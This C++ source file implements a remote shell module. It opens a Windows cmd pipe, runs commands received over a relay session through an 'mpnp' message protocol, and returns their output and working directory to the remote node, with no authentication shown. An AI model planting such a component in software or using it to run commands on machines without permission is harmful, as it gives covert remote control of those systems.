#include <iostream>
#include <cstdio>

#include "shell.h"

using namespace std;

Shell::Shell(shared_ptr<Node> n) : node(n) {}

void Shell::invoke() {
    pipe = _popen("cmd", "w");

    commands.push("echo.");
    output_path = Storage::getShellOutput();

    execute_thread = thread(&Shell::command, this);
}

void Shell::terminate() {
    if (pipe) {
        _pclose(pipe);
        pipe = nullptr;
    }
    else cout << "shell not opened" << endl; // debug

    signal = true;
    execute_thread.join();
}

void Shell::command() {
    string line, last, prelast;

    while (!signal && pipe) {
        while (!commands.empty()) {
            string data = commands.front();
            commands.pop();

            ofstream output(output_path, ios::trunc);
            output.close();

            fprintf(pipe, "%s> %s 2>&1\necho mpnpcwd>> %s 2>&1\ncd>> %s 2>&1\n", data.c_str(), output_path.c_str(), output_path.c_str(), output_path.c_str());
            fflush(pipe);

            while (!signal && pipe) {
                ifstream output(output_path);

                last = "";
                prelast = "";
                while (getline(output, line)) {
                    if (!last.empty()) {
                        prelast = last;
                    }
                    last = line;
                }

                if (prelast == "mpnpcwd") {
                    output.close();
                    output.open(output_path);

                    string content;
                    while (getline(output, line)) content += line + "\n";

                    node->returnAPNP(content, session);

                    break;
                }

                output.close();

                this_thread::sleep_for(chrono::milliseconds(SHELL_READ_FREQUENCY));
            }
        }

        this_thread::sleep_for(chrono::milliseconds(SHELL_CHECK_INCOMING_FREQUENCY));
    }

    signal = false;
}

void Shell::mpnp(string data, shared_ptr<RelaySession> s) {
	istringstream stream(data);
	string line;
	getline(stream, line);

    if (line == "noise") return;
    
    session = s;

    if (line == "invoke") invoke();
    else if (line == "terminate") terminate();
    else if (line == "command") {
        ostringstream payload;
        payload << stream.rdbuf();
        commands.push(payload.str());
    }
}